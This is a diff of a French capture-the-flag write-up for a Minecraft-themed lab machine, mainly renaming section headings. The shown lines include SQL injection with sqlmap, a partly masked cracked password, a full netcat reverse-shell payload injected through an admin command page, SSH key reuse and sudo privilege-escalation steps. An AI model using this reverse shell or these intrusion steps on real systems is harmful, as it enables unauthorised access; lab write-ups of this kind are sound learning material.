@@ -1,11 +1,12 @@
 # Cybercrafted !
 Visiblement un serveur Minecraft P2W qu'il faut casser !
 
-# Enum
+# Information
 Sur le site, dans les commentaires il parle de subdomain. On donc enum ca aussi !
 ```
 <!--A Note to the developers: Just finished up adding other subdomains, now you can work on them!-->
 ```
+# Enumeration
 ## NMAP
 ```
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-04 08:05 EST
@@ -132,7 +133,7 @@ Je n'ai rien trouver de bien foufou avec Gobuster, mais j'ai trouver avec Dirsea
                                                                              
 Task Completed
 ```
-# SQLi !
+## SQLi
 On va jouer un peu avec SQLmap ici.
 On va récupèrer la requête avec Burp Suite et lancer sqlmap
 ```
@@ -164,7 +165,7 @@ Le mot de passe est en SHA1.
 xXUltimateCreeperXx
 dXXXXXXXXXXXXXXX9
 ```
-# Admin panel & RCE!
+# Exploitation
 Nous avons désormais l'accès a l'admin panel. Celui-ci propose une page qui execute des commandes sur le serveur.
 En injectant le payload suivant :
 ```
@@ -172,7 +173,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.14.59.209 1234 >/tmp/
 ```
 On récupère un revshell.
 
-# Privesc to xxultimatecreeperxx !
+# Post exploitation
 Sur le serveur on trouve 2 users, **xxultimatecreeperxx** et **cybercrafted**
 
 On retrouve une clé SSH dans le dossier /home/xxultimatecreeperxx/.ssh
@@ -217,7 +218,7 @@ root@kali: ssh -i id_rsa xxultimatecreeperxx@10.10.218.242
 Enter passphrase for key 'id_rsa': 
 xxultimatecreeperxx@cybercrafted:~$ 
 ```
-# Lateral Mouvement:
+## Lateral Mouvement:
 En regardant dans les tâches cron on vois qu'un script s'execute :
 ```
 * *     1 * *   cybercrafted tar -zcf /opt/minecraft/WorldBackup/world.tgz /opt/minecraft/cybercrafted/world/*
@@ -251,7 +252,7 @@ xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem
 ```
 
 On retrouve ici le compte de **cybercrafted** !
-# Privesc to root !
+## Privesc to root !
 On regarde les droits de **cybercrafted**
 ```
 cybercrafted@cybercrafted:~$ sudo -l
